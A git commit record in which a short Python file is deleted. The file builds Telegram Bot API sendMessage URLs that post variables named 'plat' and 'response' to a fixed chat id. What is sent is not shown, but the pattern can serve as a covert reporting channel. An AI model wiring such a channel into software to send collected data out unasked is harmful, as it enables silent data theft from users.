7822ffe625928f24eae5b32dc285b3350e5b1da9
z0roday <100026917+z0roday@users.noreply.github.com>
2024-09-19 09:13:11 -0700

    remove api.py

--- lib/api.py
+++
@@ -1,6 +0,0 @@
-from plt import *
-
-api = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={plat}"
-
-api2 = f"https://api.telegram.org/bot{tkn}/sendMessage?chat_id={zdy}&text={response}"
-
